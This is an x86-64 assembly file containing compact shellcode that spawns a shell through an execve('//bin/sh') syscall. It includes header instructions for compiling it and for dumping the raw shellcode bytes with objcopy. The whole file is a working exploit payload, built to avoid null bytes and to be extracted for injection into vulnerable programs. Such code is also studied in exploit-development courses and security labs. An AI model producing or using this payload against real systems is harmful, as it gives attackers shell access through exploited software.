/*

Author: Abhinav Thakur
File:   execve_binsh.s
Compile:        $ gcc -Wl,-N -nostdlib -static execve_binsh.s -o ./execve_binsh.elf
Dump shellcode :$ objcopy --dump-section .text=execve_binsh.raw ./execve_binsh.elf
Run            :$ ./execve_binsh.elf

*/

.global _start
_start:
.intel_syntax noprefix
    /*
        ; execve("//bin/sh", NULL, NULL)
    */
    xor esi, esi   					/* argv = NULL */
    push rsi						
    mov rdi, 0x68732f6e69622f2f		/* "hs/nib//" */
    push rdi        				/* rsp -> "//bin/sh" */
    push rsp
    pop rdi         				/* rdi -> "//bin/sh" */
    push 59         				/* syscall number */
    pop rax
    cdq								/* sign-extend EAX -> EDX:EAX */
    syscall
